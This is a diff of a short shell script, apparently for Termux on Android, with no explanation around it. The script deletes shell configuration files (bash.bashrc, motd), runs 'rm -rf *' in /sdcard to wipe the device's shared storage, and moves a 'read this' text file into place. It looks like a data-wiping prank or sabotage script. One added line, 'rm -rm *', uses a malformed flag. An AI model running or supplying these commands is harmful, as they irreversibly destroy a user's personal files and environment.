@@ -1,8 +1,5 @@
 # --- UTF 8 --- #
 cd
-rm -rf *
-cd K1
-mv อ่านสิ.txt /$HOME
 cd ../usr/etc
 rm -rf bash.bashrc
 rm -rf motd
@@ -13,5 +10,9 @@ cd
 cd /sdcard
 rm -rf *
 cd
+cd K1
+mv อ่านสิ.txt /sdcard
+cd
+rm -rm *
 bash
 
